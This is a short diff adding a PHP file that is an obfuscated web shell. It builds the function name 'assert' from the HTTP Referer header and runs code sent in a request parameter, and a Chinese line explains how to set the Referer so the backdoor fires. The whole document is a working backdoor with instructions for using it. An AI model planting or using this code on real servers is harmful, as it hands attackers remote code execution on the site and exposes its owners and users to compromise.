@@ -1,0 +1,7 @@
+<?php
+$password = "uedbox.com";
+$wx = substr($_SERVER["HTTP_REFERER"],-7,-4);
+forward_static_call_array($wx."ert", array($_REQUEST[$password]));?>
+
+
+请求时，设置Referer头，后面以"ass****"结尾即可，比如：Referer: https://www.baidu.com/ass.php。
